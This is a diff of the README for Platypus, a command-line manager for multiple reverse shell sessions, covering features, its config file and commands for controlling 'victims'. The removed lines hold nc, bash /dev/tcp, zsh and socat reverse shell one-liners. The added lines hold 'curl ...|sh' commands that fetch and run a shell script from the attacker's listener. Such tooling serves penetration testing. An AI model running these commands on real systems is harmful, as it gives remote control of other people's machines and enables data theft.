@@ -12,8 +12,9 @@ A modern multiple reverse shell sessions/clients manager via terminal written in
 
 - [x] Multiple service listening port
 - [x] Multiple client connections
-- [x] RESTful API
-- [x] Reverse shell as a service (Pop a reverse shell in multiple languages without remembering idle commands)
+- [x] [RESTful API](./doc/RESTful.md)
+- [x] [Python SDK](https://github.com/WangYihang/Platypus-Python)
+- [x] [Reverse shell as a service](/doc/RaaS.md) (Pop a reverse shell in multiple languages without remembering idle commands)
 - [x] Download/Upload file with progress bar
 - [x] Full interactive shell
   - [x] Using vim gracefully in reverse shell
@@ -27,81 +28,123 @@ A modern multiple reverse shell sessions/clients manager via terminal written in
 > There are multiple ways to run this tool, feel free to choose one of the following method.
 
 ### Run Platypus from source code
+
 ```
 git clone https://github.com/WangYihang/Platypus
 cd Platypus
 go run platypus.go
 ```
-![](figure/install.gif)
+
 ### Run Platypus from release binaries
 1. Download `Platypus` prebuild binary from [HERE](https://github.com/WangYihang/Platypus/releases)
 2. Run the downloaded executable file
 
-### [DEPRECATED due to out of date] Run Platypus from docker
-```
-// Build your docker image
-docker build -t platypus .
-
-// Start platypus from docker container, don't forget to create port mapping
-docker run -it -p 9999:9999 platypus
-```
-
 ## Usage
 
 ### Network Topology
-* Attack IP: `192.168.174.132`
-  * Reverse Shell Service: `0.0.0.0:8080`
-  * RESTful Service: `127.0.0.1:9090`
-* Victim IP: `192.168.174.128`
 
-### Connecting victim and attacker
+* Attack IP: `192.168.88.129`
+  * Reverse Shell Service: `0.0.0.0:1337`
+  * Reverse Shell Service: `0.0.0.0:1338`
+  * RESTful Service: `127.0.0.1:7331`
+* Victim IP: `192.168.88.130`
 
-> As we all know, the using senanrio of reverse shell is about both attacker side and the victim side.
-Now we will seperate the usage guide into two views, the attacker's view and the victim's view.
+### Give it a try
 
-#### Attacker's view
+First, run `./Platypus`, then the `config.yml` will be generated automatically, and the config file is simple enough.
 
-1. First the attacker should start platypus and listen on some port (eg: 8080).
-
-![](./figure/run.gif)
-
-2. Then the victim is attacked by the attacker and a reverse shell command will be executed on the machine of victim.
-
-#### Victim's view
-The victim machine will be hacked and execute the evil command to generate a reverse shell to attack.
-
-Here are some reverse shell commands for various platform.
-```bash
-nc -e /bin/bash 192.168.174.132 8080
-bash -c 'bash -i >/dev/tcp/192.168.174.132/8080 0>&1'
-zsh -c 'zmodload zsh/net/tcp && ztcp 192.168.174.132 8080 && zsh >&$REPLY 2>&$REPLY 0>&$REPLY'
-socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:192.168.174.132:8080
+```yaml
+servers: 
+  - host: "0.0.0.0"
+    port: 1337
+    # Platypus is able to use several properties as unique identifier (primirary key) of a single client.
+    # All available properties are listed below:
+    # `%i` IP
+    # `%u` Username
+    # `%m` MAC address
+    # `%o` Operating System
+    # `%t` Income TimeStamp
+    hashFormat: "%i %u %m %o"
+  - host: "0.0.0.0"
+    port: 1338
+    # Using TimeStamp allows us to track all connections from the same IP / Username / OS and MAC.
+    hashFormat: "%i %u %m %o %t"
+restful:
+  host: "127.0.0.1"
+  port: 7331
+  enable: true
+# Check new releases from GitHub when starting Platypus
+update: false
 ```
 
+![](./figure/start.gif)
+
+As you can see, platypus will check for updates, then start listening on port 1337, 1338 and 7331
+
+The three port have different aims.
+- 1337 Reverse shell server, which **disallows** the reverse session comes from the IP.
+- 1338 Reverse shell server, which **allows** the reverse session comes from the IP.
+- 7331 Platypus [RESTful](./doc/RESTful.md) API EndPoint, which allows you to manipulate Platypus through HTTP protocol or [Python SDK](./doc/SDK.md).
+
+If you want another reverse shell listening port, just type `Run 0.0.0.0 1339` or modify the `config.yml`.
+
+Also, platypus will print help information about [RaaS](./doc/RaaS.md) which release you from remembering  tedious reverse shell commands. 
+
+With platypus, all you have to do is just copy-and-paste the `curl` command and execute it on the victim machine.
+
+```bash
+curl http://127.0.0.1:1337/|sh
+curl http://192.168.88.129:1337/|sh
+```
+
+Now, suppose that the victim is attacked by the attacker and a reverse shell command will be executed on the machine of victim.
+
 ![](./figure/connect.gif)
+
+> Notice, the RaaS feature ensure that the reverse shell process is running in background and ignore the hangup signal.
 
 ### Controlling the victim
 
 #### List all victims
 
+You can use `List` command to print table style infomation about all listening servers and connected clients. Notice that the port `1337` will reset the connection from the same machine (we consider two connection are same iff they share the same Hash value, the info being hash can be configured in `config.yml`). Port `1338` will not reset such connections, which provide more repliability.
+
 ![](./figure/list.gif)
 
 #### Select a victim
+
+`Jump` command can take you a tour between clients.
+Use `Jump [HASH / Alias]` to jump. `Alias` is a alias of a specific client, you can set a alias of a client via `Alias [ALIAS]`.
+Also, for jumping through `HASH`, you do not need to type the whole hash, just prefix of hash will work.
+
+> All commands are case insensitive, feel free to use tab for completing.
+
 ![](./figure/jump.gif)
 
+
 #### Interactive shell
+
+`Interact` will popup a shell, just like `netcat`.
+
 ![](./figure/interact.gif)
 
 #### Download file
+
+Use `Download` command to download file from reverse shell client to attacker's machine.
+
 ![](./figure/download.gif)
 
 #### Upload file
+
+Use `Upload` command to upload file to the current interacting client.
+
 ![](./figure/upload.gif)
 
-### Advanced [Usages](./USAGE.md)
+### Advanced [Usages](./doc)
 
 * Reverse shell as a Service (RaaS)
 * RESTful API
+* Python SDK
 
 #### Using `VIM` in Reverse Shell (Only on `Linux`)
 > Demonstration is to be done.
